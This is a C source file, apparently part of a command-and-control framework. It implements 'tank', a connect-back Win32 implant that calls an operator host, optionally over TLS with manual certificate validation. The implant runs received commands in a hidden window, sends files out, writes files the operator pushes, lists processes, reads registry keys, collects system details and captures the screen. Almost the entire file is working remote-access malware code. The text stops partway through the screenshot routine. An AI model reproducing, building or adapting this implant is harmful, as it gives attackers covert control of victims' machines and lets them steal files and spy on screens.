/*
 * tank.c  --  AeldreC2 Tank Program v1
 *
 * Connect-back Win32 implant.  Calls home to Joshua, receives commands,
 * executes them, streams output back.  Reconnects automatically.
 *
 * Targets: Windows 95, NT 3.1 / 3.5 / 3.51 / NT 4
 *          Win32s: connects + banner; shell exec not reliable.
 *
 * Build:
 *   wcl386 -za99 -bt=nt tank.c recognizer.obj wsock32.lib
 *
 * CLU patches the g_clu_block struct by scanning for the magic string.
 * Compile-time defaults: -DTANK_C2_HOST="x.x.x.x" -DTANK_C2_PORT=nnn
 *
 * Protocol (line-oriented):
 *   operator -> tank:  <command>\n
 *   tank -> operator:  <output> ... <<<DONE>>>\n
 *   get <path>         FILE:<size>\n <raw bytes> <<<DONE>>>\n
 *   put <path>         PUTREADY\n  wait PUTSIZE:<n>\n  <n bytes>  <<<DONE>>>\n
 *   screenshot         FILE:<size>\n <bmp bytes> <<<DONE>>>\n
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock.h>
#include <string.h>
#include <stdlib.h>

/* -----------------------------------------------------------------------
 * Build-time defaults — CLU overrides via the patchable block below.
 * ----------------------------------------------------------------------- */
/* Stringify helpers so TANK_C2_HOST can be passed without shell quoting:
 *   -DTANK_C2_HOST=10.0.2.15   (no quotes needed on command line) */
#define TANK_STR_(x)    #x
#define TANK_STR(x)     TANK_STR_(x)

#ifndef TANK_C2_HOST
#  define TANK_C2_HOST  127.0.0.1   /* override: -DTANK_C2_HOST=x.x.x.x */
#endif
#ifndef TANK_C2_PORT
#  define TANK_C2_PORT  4444
#endif
#ifndef TANK_RETRY_MS
#  define TANK_RETRY_MS 30000
#endif

/* -----------------------------------------------------------------------
 * CLU patchable configuration block.
 * CLU scans the binary for "AELDRECLU0001", then overwrites:
 *   offset 14: host  (64 bytes, null-padded)
 *   offset 78: port  (2 bytes, little-endian WORD)
 *   offset 80: tls   (1 byte,  0 = plain, 1 = TLS)
 * ----------------------------------------------------------------------- */
#pragma pack(1)
static struct {
    char  magic[14];
    char  host[64];
    WORD  port;
    BYTE  tls;
} g_clu = {
    "AELDRECLU0001",
    TANK_STR(TANK_C2_HOST),  /* char[64]: C zero-fills remainder */
    TANK_C2_PORT,
    0
};
#pragma pack()

/* -----------------------------------------------------------------------
 * Tunables
 * ----------------------------------------------------------------------- */
#define CMD_BUFSZ   4096
#define OUT_BUFSZ   32768
#define TLS_BUFSZ   (32*1024)
#define DONE_STR    "<<<DONE>>>\n"
#define DONE_LEN    11

#ifndef CREATE_NO_WINDOW
#  define CREATE_NO_WINDOW 0x08000000UL
#endif

/* -----------------------------------------------------------------------
 * Schannel / SSPI types (inline — no security.h required)
 * ----------------------------------------------------------------------- */
typedef LONG SECURITY_STATUS;
typedef struct { ULONG_PTR dwLower; ULONG_PTR dwUpper; } NC_SecHandle;
typedef NC_SecHandle CredHandle;
typedef NC_SecHandle CtxtHandle;
typedef struct { DWORD LowPart; LONG HighPart; } NC_TimeStamp;
typedef struct { ULONG cbBuffer; ULONG BufferType; PVOID pvBuffer; } SecBuffer;
typedef struct { ULONG ulVersion; ULONG cBuffers; SecBuffer *pBuffers; } SecBufferDesc;
typedef struct {
    ULONG cbHeader; ULONG cbTrailer; ULONG cbMaximumMessage;
    ULONG cBuffers; ULONG cbBlockSize;
} SecPkgContext_StreamSizes;
typedef struct {
    DWORD dwVersion; DWORD cCreds; void **paCred; HANDLE hRootStore;
    DWORD cMappers; void **aphMappers; DWORD cSupportedAlgs; DWORD *palgSupportedAlgs;
    DWORD grbitEnabledProtocols; DWORD dwMinimumCipherStrength;
    DWORD dwMaximumCipherStrength; DWORD dwSessionLifespan;
    DWORD dwFlags; DWORD dwCredFormat;
} NC_SchannelCred;

#define NC_SECBUF_VERSION           0
#define NC_SECBUFFER_EMPTY          0
#define NC_SECBUFFER_DATA           1
#define NC_SECBUFFER_TOKEN          2
#define NC_SECBUFFER_EXTRA          5
#define NC_SECBUFFER_STREAM_TRAILER 6
#define NC_SECBUFFER_STREAM_HEADER  7
#define NC_SEC_E_OK                 ((SECURITY_STATUS)0x00000000L)
#define NC_SEC_I_CONTINUE_NEEDED    ((SECURITY_STATUS)0x00090312L)
#define NC_SEC_E_INCOMPLETE_MESSAGE ((SECURITY_STATUS)0x80090318L)
#define NC_SECPKG_ATTR_STREAM_SIZES 4
#define NC_SECPKG_CRED_OUTBOUND     2
#define NC_SCHANNEL_CRED_VERSION    4
#define NC_SP_PROT_TLS1_2_CLIENT    0x00000200
#define NC_SP_PROT_TLS1_3_CLIENT    0x00002000
#define NC_SCH_CRED_NO_DEFAULT_CREDS       0x00000010
#define NC_SCH_CRED_MANUAL_CRED_VALIDATION 0x00000008
#define NC_ISC_REQ_REPLAY_DETECT    0x00000004
#define NC_ISC_REQ_SEQUENCE_DETECT  0x00000008
#define NC_ISC_REQ_CONFIDENTIALITY  0x00000010
#define NC_ISC_REQ_ALLOCATE_MEMORY  0x00000100
#define NC_ISC_REQ_STREAM           0x00008000
#define NC_ISC_REQ_MANUAL_CRED_VAL  0x00080000
#define NC_UNISP_NAME "Microsoft Unified Security Protocol Provider"

typedef SECURITY_STATUS (WINAPI *pfAcqCred)(char*,char*,ULONG,void*,void*,void*,void*,CredHandle*,NC_TimeStamp*);
typedef SECURITY_STATUS (WINAPI *pfInitSecCtx)(CredHandle*,CtxtHandle*,char*,ULONG,ULONG,ULONG,SecBufferDesc*,ULONG,CtxtHandle*,SecBufferDesc*,PULONG,NC_TimeStamp*);
typedef SECURITY_STATUS (WINAPI *pfFreeCredH)(CredHandle*);
typedef SECURITY_STATUS (WINAPI *pfDelSecCtx)(CtxtHandle*);
typedef SECURITY_STATUS (WINAPI *pfEncMsg)(CtxtHandle*,ULONG,SecBufferDesc*,ULONG);
typedef SECURITY_STATUS (WINAPI *pfDecMsg)(CtxtHandle*,SecBufferDesc*,ULONG,PULONG);
typedef SECURITY_STATUS (WINAPI *pfFreeCtxBuf)(void*);
typedef SECURITY_STATUS (WINAPI *pfQryCtxAttr)(CtxtHandle*,ULONG,void*);

static HMODULE      t_secur32    = NULL;
static pfAcqCred    t_AcqCred    = NULL;
static pfInitSecCtx t_InitSecCtx = NULL;
static pfFreeCredH  t_FreeCred   = NULL;
static pfDelSecCtx  t_DelSecCtx  = NULL;
static pfEncMsg     t_EncMsg     = NULL;
static pfDecMsg     t_DecMsg     = NULL;
static pfFreeCtxBuf t_FreeCtxBuf = NULL;
static pfQryCtxAttr t_QryCtxAttr = NULL;
static int          t_tls_avail  = 0;
static int          t_tls_on     = 0;
static CredHandle   t_cred;
static CtxtHandle   t_ctx;
static int          t_cred_valid = 0;
static int          t_ctx_valid  = 0;
static SecPkgContext_StreamSizes t_sizes;

/* Encrypted receive buffer (raw from network) */
static char  t_enc_buf[TLS_BUFSZ];
static int   t_enc_len = 0;
/* Decrypted plaintext ready to consume */
static char  t_dec_buf[TLS_BUFSZ];
static int   t_dec_r   = 0;
static int   t_dec_len = 0;

/* -----------------------------------------------------------------------
 * ToolHelp32 types (inline)
 * ----------------------------------------------------------------------- */
#define TC_TH32CS_SNAPPROCESS 0x00000002UL
typedef struct {
    DWORD dwSize; DWORD cntUsage; DWORD th32ProcessID;
    DWORD th32DefaultHeapID; DWORD th32ModuleID; DWORD cntThreads;
    DWORD th32ParentProcessID; LONG pcPriClassBase; DWORD dwFlags;
    char  szExeFile[MAX_PATH];
} TC_PE32;
typedef HANDLE (WINAPI *PFN_CTS)(DWORD,DWORD);
typedef BOOL   (WINAPI *PFN_P32F)(HANDLE,TC_PE32*);
typedef BOOL   (WINAPI *PFN_P32N)(HANDLE,TC_PE32*);

/* -----------------------------------------------------------------------
 * External: Recognizer module (recognizer.c)
 * ----------------------------------------------------------------------- */
extern int recognizer_check(void);

/* -----------------------------------------------------------------------
 * TLS: load secur32.dll
 * ----------------------------------------------------------------------- */
static void tls_load(void)
{
    t_secur32 = LoadLibrary("secur32.dll");
    if (!t_secur32) return;
#define GF(v,n) v=(void*)GetProcAddress(t_secur32,n); if(!v){FreeLibrary(t_secur32);t_secur32=NULL;return;}
    GF(t_AcqCred,    "AcquireCredentialsHandleA")
    GF(t_InitSecCtx, "InitializeSecurityContextA")
    GF(t_FreeCred,   "FreeCredentialsHandle")
    GF(t_DelSecCtx,  "DeleteSecurityContext")
    GF(t_EncMsg,     "EncryptMessage")
    GF(t_DecMsg,     "DecryptMessage")
    GF(t_FreeCtxBuf, "FreeContextBuffer")
    GF(t_QryCtxAttr, "QueryContextAttributesA")
#undef GF
    t_tls_avail = 1;
}

/* -----------------------------------------------------------------------
 * TLS: blocking handshake after TCP connect
 * ----------------------------------------------------------------------- */
static int tls_handshake(SOCKET s)
{
    NC_SchannelCred cred;
    NC_TimeStamp    ts;
    ULONG           attrs;
    SecBuffer       out_buf;
    SecBufferDesc   out_desc;
    SECURITY_STATUS ss;

    if (!t_tls_avail) return 0;

    memset(&cred, 0, sizeof(cred));
    cred.dwVersion             = NC_SCHANNEL_CRED_VERSION;
    cred.grbitEnabledProtocols = NC_SP_PROT_TLS1_2_CLIENT | NC_SP_PROT_TLS1_3_CLIENT;
    cred.dwFlags               = NC_SCH_CRED_NO_DEFAULT_CREDS | NC_SCH_CRED_MANUAL_CRED_VALIDATION;

    ss = t_AcqCred(NULL, NC_UNISP_NAME, NC_SECPKG_CRED_OUTBOUND,
                   NULL, &cred, NULL, NULL, &t_cred, &ts);
    if (ss != NC_SEC_E_OK) return 0;
    t_cred_valid = 1;

    attrs = NC_ISC_REQ_REPLAY_DETECT | NC_ISC_REQ_SEQUENCE_DETECT |
            NC_ISC_REQ_CONFIDENTIALITY | NC_ISC_REQ_ALLOCATE_MEMORY |
            NC_ISC_REQ_STREAM | NC_ISC_REQ_MANUAL_CRED_VAL;

    out_buf.cbBuffer = 0; out_buf.BufferType = NC_SECBUFFER_TOKEN; out_buf.pvBuffer = NULL;
    out_desc.ulVersion = NC_SECBUF_VERSION; out_desc.cBuffers = 1; out_desc.pBuffers = &out_buf;

    ss = t_InitSecCtx(&t_cred, NULL, g_clu.host, attrs, 0, 0, NULL, 0,
                      &t_ctx, &out_desc, &attrs, &ts);
    t_ctx_valid = 1;

    if (out_buf.pvBuffer && out_buf.cbBuffer > 0) {
        send(s, (char *)out_buf.pvBuffer, (int)out_buf.cbBuffer, 0);
        t_FreeCtxBuf(out_buf.pvBuffer);
    }

    while (ss == NC_SEC_I_CONTINUE_NEEDED || ss == NC_SEC_E_INCOMPLETE_MESSAGE) {
        SecBuffer in_bufs[2];
        SecBufferDesc in_desc;
        int n, i, orig_len;

        n = recv(s, t_enc_buf + t_enc_len,
                 (int)(sizeof(t_enc_buf) - t_enc_len), 0);
        if (n <= 0) return 0;
        t_enc_len += n;

        in_bufs[0].cbBuffer   = (ULONG)t_enc_len;
        in_bufs[0].BufferType = NC_SECBUFFER_TOKEN;
        in_bufs[0].pvBuffer   = t_enc_buf;
        in_bufs[1].cbBuffer   = 0;
        in_bufs[1].BufferType = NC_SECBUFFER_EMPTY;
        in_bufs[1].pvBuffer   = NULL;
        in_desc.ulVersion = NC_SECBUF_VERSION;
        in_desc.cBuffers  = 2;
        in_desc.pBuffers  = in_bufs;

        out_buf.cbBuffer = 0; out_buf.BufferType = NC_SECBUFFER_TOKEN; out_buf.pvBuffer = NULL;
        out_desc.ulVersion = NC_SECBUF_VERSION; out_desc.cBuffers = 1; out_desc.pBuffers = &out_buf;

        orig_len = t_enc_len;
        ss = t_InitSecCtx(&t_cred, &t_ctx, g_clu.host, attrs, 0, 0, &in_desc, 0,
                          &t_ctx, &out_desc, &attrs, &ts);

        if (out_buf.pvBuffer && out_buf.cbBuffer > 0) {
            send(s, (char *)out_buf.pvBuffer, (int)out_buf.cbBuffer, 0);
            t_FreeCtxBuf(out_buf.pvBuffer);
        }

        t_enc_len = 0;
        for (i = 0; i < 2; i++) {
            if (in_bufs[i].BufferType == NC_SECBUFFER_EXTRA && in_bufs[i].cbBuffer > 0) {
                int extra = (int)in_bufs[i].cbBuffer;
                memmove(t_enc_buf, t_enc_buf + (orig_len - extra), extra);
                t_enc_len = extra;
                break;
            }
        }
    }

    if (ss != NC_SEC_E_OK) return 0;
    t_QryCtxAttr(&t_ctx, NC_SECPKG_ATTR_STREAM_SIZES, &t_sizes);
    t_tls_on = 1;
    return 1;
}

static void tls_teardown(void)
{
    if (t_ctx_valid)  { t_DelSecCtx(&t_ctx);  t_ctx_valid  = 0; }
    if (t_cred_valid) { t_FreeCred(&t_cred);  t_cred_valid = 0; }
    t_tls_on  = 0;
    t_enc_len = 0;
    t_dec_r   = 0;
    t_dec_len = 0;
}

/* -----------------------------------------------------------------------
 * TLS: receive one plaintext byte (blocking, feeds DecryptMessage)
 * ----------------------------------------------------------------------- */
static int tls_recv_byte(SOCKET s, char *out)
{
    int i;

    if (t_dec_r < t_dec_len) {
        *out = t_dec_buf[t_dec_r++];
        return 1;
    }
    t_dec_r = t_dec_len = 0;

    /* Need more data */
    {
        int n = recv(s, t_enc_buf + t_enc_len,
                     (int)(sizeof(t_enc_buf) - t_enc_len), 0);
        if (n <= 0) return n;
        t_enc_len += n;
    }

    {
        SecBuffer bufs[4]; SecBufferDesc desc; ULONG qop = 0;
        SECURITY_STATUS ss;

        bufs[0].cbBuffer   = (ULONG)t_enc_len;
        bufs[0].BufferType = NC_SECBUFFER_DATA;
        bufs[0].pvBuffer   = t_enc_buf;
        bufs[1].cbBuffer = 0; bufs[1].BufferType = NC_SECBUFFER_EMPTY; bufs[1].pvBuffer = NULL;
        bufs[2].cbBuffer = 0; bufs[2].BufferType = NC_SECBUFFER_EMPTY; bufs[2].pvBuffer = NULL;
        bufs[3].cbBuffer = 0; bufs[3].BufferType = NC_SECBUFFER_EMPTY; bufs[3].pvBuffer = NULL;
        desc.ulVersion = NC_SECBUF_VERSION; desc.cBuffers = 4; desc.pBuffers = bufs;

        ss = t_DecMsg(&t_ctx, &desc, 0, &qop);

        if (ss == NC_SEC_E_INCOMPLETE_MESSAGE) {
            /* Need even more encrypted data before we can decrypt */
            return tls_recv_byte(s, out);
        }
        if (ss != NC_SEC_E_OK) return -1;

        for (i = 0; i < 4; i++) {
            if (bufs[i].BufferType == NC_SECBUFFER_DATA && bufs[i].cbBuffer > 0) {
                int len = (int)bufs[i].cbBuffer;
                if (len > (int)sizeof(t_dec_buf)) len = (int)sizeof(t_dec_buf);
                memcpy(t_dec_buf, bufs[i].pvBuffer, len);
                t_dec_len = len;
                t_dec_r   = 0;
                break;
            }
        }

        t_enc_len = 0;
        for (i = 0; i < 4; i++) {
            if (bufs[i].BufferType == NC_SECBUFFER_EXTRA && bufs[i].cbBuffer > 0) {
                int extra = (int)bufs[i].cbBuffer;
                memmove(t_enc_buf, bufs[i].pvBuffer, extra);
                t_enc_len = extra;
                break;
            }
        }
    }

    if (t_dec_len > 0) {
        *out = t_dec_buf[t_dec_r++];
        return 1;
    }
    return tls_recv_byte(s, out);  /* renegotiation / empty record */
}

/* -----------------------------------------------------------------------
 * TLS: send all bytes
 * ----------------------------------------------------------------------- */
static int tls_send_all(SOCKET s, const char *buf, int len)
{
    int sent = 0;
    while (sent < len) {
        char *tbuf;
        int   chunk = len - sent;
        int   total;
        SecBuffer bufs[4]; SecBufferDesc desc; SECURITY_STATUS ss;

        if (chunk > (int)t_sizes.cbMaximumMessage)
            chunk = (int)t_sizes.cbMaximumMessage;

        total = (int)(t_sizes.cbHeader + (ULONG)chunk + t_sizes.cbTrailer);
        tbuf  = (char *)GlobalAlloc(GMEM_FIXED, total);
        if (!tbuf) return -1;

        memcpy(tbuf + t_sizes.cbHeader, buf + sent, chunk);
        bufs[0].cbBuffer = t_sizes.cbHeader;  bufs[0].BufferType = NC_SECBUFFER_STREAM_HEADER;  bufs[0].pvBuffer = tbuf;
        bufs[1].cbBuffer = (ULONG)chunk;      bufs[1].BufferType = NC_SECBUFFER_DATA;            bufs[1].pvBuffer = tbuf + t_sizes.cbHeader;
        bufs[2].cbBuffer = t_sizes.cbTrailer; bufs[2].BufferType = NC_SECBUFFER_STREAM_TRAILER; bufs[2].pvBuffer = tbuf + t_sizes.cbHeader + chunk;
        bufs[3].cbBuffer = 0;                 bufs[3].BufferType = NC_SECBUFFER_EMPTY;          bufs[3].pvBuffer = NULL;
        desc.ulVersion = NC_SECBUF_VERSION; desc.cBuffers = 4; desc.pBuffers = bufs;

        ss = t_EncMsg(&t_ctx, 0, &desc, 0);
        if (ss == NC_SEC_E_OK) send(s, tbuf, total, 0);
        GlobalFree(tbuf);
        if (ss != NC_SEC_E_OK) return -1;
        sent += chunk;
    }
    return 0;
}

/* -----------------------------------------------------------------------
 * Helpers
 * ----------------------------------------------------------------------- */
static int send_all(SOCKET s, const char *buf, int len)
{
    if (t_tls_on) return tls_send_all(s, buf, len);
    {
        int sent = 0;
        while (sent < len) {
            int n = send(s, buf + sent, len - sent, 0);
            if (n == SOCKET_ERROR) return -1;
            sent += n;
        }
    }
    return 0;
}

static int send_str(SOCKET s, const char *str) { return send_all(s, str, lstrlen(str)); }
static int send_done(SOCKET s)                  { return send_all(s, DONE_STR, DONE_LEN); }

static int recv_one(SOCKET s, char *c)
{
    if (t_tls_on) return tls_recv_byte(s, c);
    return recv(s, c, 1, 0);
}

static int recv_line(SOCKET s, char *buf, int bufsz)
{
    int  pos = 0;
    char c;
    int  n;
    while (pos < bufsz - 1) {
        n = recv_one(s, &c);
        if (n <= 0) return n;
        if (c == '\r') continue;
        if (c == '\n') { buf[pos] = '\0'; return pos; }
        buf[pos++] = c;
    }
    buf[pos] = '\0';
    return pos;
}

/* Read exactly len bytes (blocking), TLS-aware */
static int recv_exact(SOCKET s, char *buf, DWORD len)
{
    DWORD got = 0;
    while (got < len) {
        if (t_tls_on) {
            char c;
            int r = tls_recv_byte(s, &c);
            if (r <= 0) return (int)r;
            buf[got++] = c;
        } else {
            int r = recv(s, buf + got, (int)(len - got), 0);
            if (r <= 0) return r;
            got += (DWORD)r;
        }
    }
    return (int)got;
}

static int nc_nicmp(const char *a, const char *b, int n)
{
    int i;
    for (i = 0; i < n; i++) {
        char ca = (a[i]>='A'&&a[i]<='Z')?(char)(a[i]+32):a[i];
        char cb = (b[i]>='A'&&b[i]<='Z')?(char)(b[i]+32):b[i];
        if (ca != cb) return (int)(unsigned char)ca-(int)(unsigned char)cb;
        if (!a[i]) return 0;
    }
    return 0;
}

static int cmd_is(const char *cmd, const char *verb)
{
    int vl = lstrlen(verb);
    return nc_nicmp(cmd, verb, vl) == 0 && (cmd[vl]=='\0'||cmd[vl]==' ');
}

static const char *cmd_arg(const char *cmd, const char *verb)
{
    int vl = lstrlen(verb);
    return (cmd[vl]==' ') ? cmd+vl+1 : cmd+vl;
}

static void find_shell(char *out, int bufsz)
{
    char dir[MAX_PATH], path[MAX_PATH];
    GetSystemDirectory(dir, MAX_PATH);
    wsprintf(path, "%s\\cmd.exe", dir);
    if (GetFileAttributes(path) != 0xFFFFFFFF) { lstrcpyn(out, path, bufsz); return; }
    GetWindowsDirectory(dir, MAX_PATH);
    wsprintf(path, "%s\\COMMAND.COM", dir);
    lstrcpyn(out, path, bufsz);
}

/* -----------------------------------------------------------------------
 * Native commands
 * ----------------------------------------------------------------------- */
static int cmd_sysinfo(SOCKET s)
{
    char          buf[1024];
    char          compname[MAX_PATH], username[MAX_PATH];
    DWORD         namesz;
    OSVERSIONINFO osv;
    MEMORYSTATUS  ms;
    DWORD         drives;
    int           i;

    namesz = MAX_PATH; compname[0] = '\0'; GetComputerName(compname, &namesz);
    namesz = MAX_PATH; username[0] = '\0'; GetUserName(username, &namesz);
    memset(&osv, 0, sizeof(osv)); osv.dwOSVersionInfoSize = sizeof(osv); GetVersionEx(&osv);
    ms.dwLength = sizeof(ms); GlobalMemoryStatus(&ms);

    wsprintf(buf,
        "Host:   %s\r\nUser:   %s\r\n"
        "OS:     %lu.%lu (build %lu) %s\r\n"
        "RAM:    %lu MB total  %lu MB free\r\n",
        compname[0] ? compname : "unknown",
        username[0] ? username : "unknown",
        osv.dwMajorVersion, osv.dwMinorVersion, osv.dwBuildNumber,
        osv.szCSDVersion,
        ms.dwTotalPhys >> 20, ms.dwAvailPhys >> 20);
    send_str(s, buf);

    drives = GetLogicalDrives();
    send_str(s, "Drives: ");
    for (i = 0; i < 26; i++) {
        if (drives & (1UL << i)) {
            char root[4]; UINT dt; char ts[12];
            wsprintf(root, "%c:\\", 'A'+i);
            dt = GetDriveType(root);
            switch (dt) {
            case DRIVE_REMOVABLE: lstrcpy(ts,"removable"); break;
            case DRIVE_FIXED:     lstrcpy(ts,"fixed");     break;
            case DRIVE_REMOTE:    lstrcpy(ts,"remote");    break;
            case DRIVE_CDROM:     lstrcpy(ts,"cdrom");     break;
            case DRIVE_RAMDISK:   lstrcpy(ts,"ramdisk");   break;
            default:              lstrcpy(ts,"?");          break;
            }
            wsprintf(buf, "%s(%s) ", root, ts);
            send_str(s, buf);
        }
    }
    send_str(s, "\r\n");
    return send_done(s);
}

static int cmd_ps(SOCKET s)
{
    HMODULE  hK = GetModuleHandle("kernel32.dll");
    PFN_CTS  fCTS  = hK ? (PFN_CTS) GetProcAddress(hK,"CreateToolhelp32Snapshot") : NULL;
    PFN_P32F fP32F = hK ? (PFN_P32F)GetProcAddress(hK,"Process32First") : NULL;
    PFN_P32N fP32N = hK ? (PFN_P32N)GetProcAddress(hK,"Process32Next")  : NULL;
    HANDLE   snap;
    TC_PE32  pe;
    char     line[MAX_PATH+64];

    if (!fCTS||!fP32F||!fP32N) {
        send_str(s,"ps: ToolHelp32 not available (NT<4 / Win32s)\r\n");
        return send_done(s);
    }
    snap = fCTS(TC_TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) { send_str(s,"ps: snapshot failed\r\n"); return send_done(s); }
    send_str(s,"  PID  Thds  Parent  Name\r\n");
    send_str(s,"-----  ----  ------  ----\r\n");
    pe.dwSize = sizeof(pe);
    if (fP32F(snap,&pe)) do {
        wsprintf(line,"%5lu  %4lu  %6lu  %s\r\n",
                 pe.th32ProcessID,pe.cntThreads,pe.th32ParentProcessID,pe.szExeFile);
        send_str(s,line);
    } while (fP32N(snap,&pe));
    CloseHandle(snap);
    return send_done(s);
}

static int cmd_ls(SOCKET s, const char *path)
{
    WIN32_FIND_DATA wfd;
    HANDLE hFind;
    char   pattern[MAX_PATH], line[MAX_PATH+32];

    if (!path||!path[0]) {
        GetCurrentDirectory(MAX_PATH,pattern); lstrcat(pattern,"\\*");
    } else {
        lstrcpyn(pattern,path,MAX_PATH-3);
        { int l=lstrlen(pattern);
          if(l>0&&pattern[l-1]!='\\'&&pattern[l-1]!='*') lstrcat(pattern,"\\*"); }
    }
    hFind = FindFirstFile(pattern,&wfd);
    if (hFind==INVALID_HANDLE_VALUE) {
        wsprintf(line,"ls: cannot open '%s'\r\n",pattern);
        send_str(s,line); return send_done(s);
    }
    do {
        BOOL d = (wfd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)!=0;
        if (d) wsprintf(line,"     <DIR>        %s\r\n",wfd.cFileName);
        else   wsprintf(line,"%12lu  %s\r\n",wfd.nFileSizeLow,wfd.cFileName);
        send_str(s,line);
    } while (FindNextFile(hFind,&wfd));
    FindClose(hFind);
    return send_done(s);
}

static int cmd_get(SOCKET s, const char *path)
{
    HANDLE hFile; DWORD fsize, nread; char header[64]; char *buf; int rc=0;
    if (!path||!path[0]) { send_str(s,"get: no path\r\n"); return send_done(s); }
    hFile = CreateFile(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
    if (hFile==INVALID_HANDLE_VALUE) {
        char m[MAX_PATH+40]; wsprintf(m,"get: cannot open '%s' (%lu)\r\n",path,GetLastError());
        send_str(s,m); return send_done(s);
    }
    fsize = GetFileSize(hFile,NULL);
    wsprintf(header,"FILE:%lu\n",fsize);
    send_str(s,header);
    buf = (char*)GlobalAlloc(GMEM_FIXED,OUT_BUFSZ);
    if (!buf) { CloseHandle(hFile); send_str(s,"get: oom\r\n"); return send_done(s); }
    while (ReadFile(hFile,buf,OUT_BUFSZ,&nread,NULL)&&nread>0)
        if (send_all(s,buf,(int)nread)<0) { rc=-1; break; }
    CloseHandle(hFile); GlobalFree(buf);
    if (rc==0) rc=send_done(s);
    return rc;
}

static int cmd_put(SOCKET s, const char *path)
{
    char  line[64];
    DWORD expected, total;
    HANDLE hFile;
    char  *buf;
    int    n;

    if (!path||!path[0]) { send_str(s,"put: no path\r\n"); return send_done(s); }
    send_str(s,"PUTREADY\n");

    n = recv_line(s,line,sizeof(line));
    if (n<=0) return n;
    if (nc_nicmp(line,"PUTSIZE:",8)!=0) { send_str(s,"put: protocol error\r\n"); return send_done(s); }
    expected = (DWORD)atol(line+8);

    hFile = CreateFile(path,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    if (hFile==INVALID_HANDLE_VALUE) {
        char m[MAX_PATH+40]; wsprintf(m,"put: cannot create '%s' (%lu)\r\n",path,GetLastError());
        send_str(s,m); return send_done(s);
    }

    buf = (char*)GlobalAlloc(GMEM_FIXED,OUT_BUFSZ);
    if (!buf) { CloseHandle(hFile); send_str(s,"put: oom\r\n"); return send_done(s); }

    total = 0;
    while (total < expected) {
        DWORD want = expected-total;
        DWORD written;
        if (want > OUT_BUFSZ) want = OUT_BUFSZ;
        n = recv_exact(s, buf, want);
        if (n <= 0) { CloseHandle(hFile); GlobalFree(buf); return n; }
        WriteFile(hFile, buf, (DWORD)n, &written, NULL);
        total += (DWORD)n;
    }

    CloseHandle(hFile);
    GlobalFree(buf);
    return send_done(s);
}

static int cmd_regq(SOCKET s, const char *keypath)
{
    HKEY  hive, hkey;
    LONG  ret;
    DWORD idx;
    char  vname[256], line[1536];
    BYTE  vdata[1024];

    struct { const char *n; HKEY h; } hives[] = {
        {"HKLM\\",HKEY_LOCAL_MACHINE},{"HKEY_LOCAL_MACHINE\\",HKEY_LOCAL_MACHINE},
        {"HKCU\\",HKEY_CURRENT_USER}, {"HKEY_CURRENT_USER\\",HKEY_CURRENT_USER},
        {"HKCR\\",HKEY_CLASSES_ROOT}, {"HKEY_CLASSES_ROOT\\",HKEY_CLASSES_ROOT},
        {"HKU\\", HKEY_USERS},        {"HKEY_USERS\\",HKEY_USERS},
        {"HKLM",HKEY_LOCAL_MACHINE},  {"HKCU",HKEY_CURRENT_USER},
    };
    const char *subkey = keypath;
    int i;

    if (!keypath||!keypath[0]) { send_str(s,"regq: no key\r\n"); return send_done(s); }
    hive = NULL;
    for (i=0;i<(int)(sizeof(hives)/sizeof(hives[0]));i++) {
        int n=lstrlen(hives[i].n);
        if (nc_nicmp(keypath,hives[i].n,n)==0) { hive=hives[i].h; subkey=keypath+n; break; }
    }
    if (!hive) { send_str(s,"regq: unknown hive\r\n"); return send_done(s); }

    ret = RegOpenKeyEx(hive,subkey,0,KEY_READ,&hkey);
    if (ret!=ERROR_SUCCESS) {
        wsprintf(line,"regq: cannot open key (%ld)\r\n",ret);
        send_str(s,line); return send_done(s);
    }
    wsprintf(line,"[%s]\r\n",keypath); send_str(s,line);
    for (idx=0;;idx++) {
        DWORD vsz=sizeof(vname),dsz=sizeof(vdata),vtype;
        ret=RegEnumValue(hkey,idx,vname,&vsz,NULL,&vtype,vdata,&dsz);
        if (ret==ERROR_NO_MORE_ITEMS||ret!=ERROR_SUCCESS) break;
        switch(vtype) {
        case REG_SZ: case REG_EXPAND_SZ:
            wsprintf(line,"  \"%s\" = \"%s\"\r\n",vname[0]?vname:"(Default)",(char*)vdata); break;
        case REG_DWORD:
            wsprintf(line,"  \"%s\" = dword:%08lX\r\n",vname[0]?vname:"(Default)",*(DWORD*)vdata); break;
        default:
            wsprintf(line,"  \"%s\" = type%lu[%lu bytes]\r\n",vname[0]?vname:"(Default)",vtype,dsz); break;
        }
        send_str(s,line);
    }
    RegCloseKey(hkey);
    return send_done(s);
}

static int cmd_screenshot(SOCKET s)
{
    int   w, h;
    HDC   hdcScr, hdcMem;
    HBITMAP hBmp;
    BITMAPINFO bmi;
    BITMAPFILEHEADER bfh;
    DWORD pixel_bytes, total;
    char  *pixels;
    char  header[64];

    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);

    hdcScr = GetDC(NULL);
    hdcMem = CreateCompatibleDC(hdcScr);
    hBmp   = CreateCompatibleBitmap(hdcScr, w, h);
    SelectObject(hdcMem, hBmp);
    BitBlt(hdcMem, 0, 0, w, h, hdcScr, 0, 0, SRCCOPY);
    ReleaseDC(NULL, hdcScr);

    memset(&bmi, 0, sizeof(bmi));
    bmi.bmiHeader.biSize        = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth       = w;
    bmi.bmiHeader.biHeight      = -h;   /* top-down */
    bmi.bmiHeader.biPlanes      = 1;
    bmi.bmiHeader.biBitCount    = 24;
    bmi.bmiHeader.biCompression = BI_RGB;

    pixel_bytes = (DWORD)(((w * 3 + 3) & ~3) * h);
    total       = sizeof(bfh) + sizeof(BITMAPINFOHEADER) + pixel_bytes;

    pixels = (char *)GlobalAlloc(GMEM_FIXED, pixel_bytes);
    if (!pixels) {
        DeleteObject(hBmp); DeleteDC(hdcMem);
        send_str(s,"screenshot: out of memory\r\n"); return send_done(s);
    }

    GetDIBits(hdcMem, hBmp, 0, h, pixels, &bmi, DIB_RGB_COLORS);
    DeleteObject(hBmp); DeleteDC(hdcMem);

    wsprintf(header, "FILE:%lu\n", total);
    send_str(s, header);

    memset(&bfh,0,sizeof(bfh));
    bfh.bfType    = 0x4D42;
    bfh.bfSize    = total;
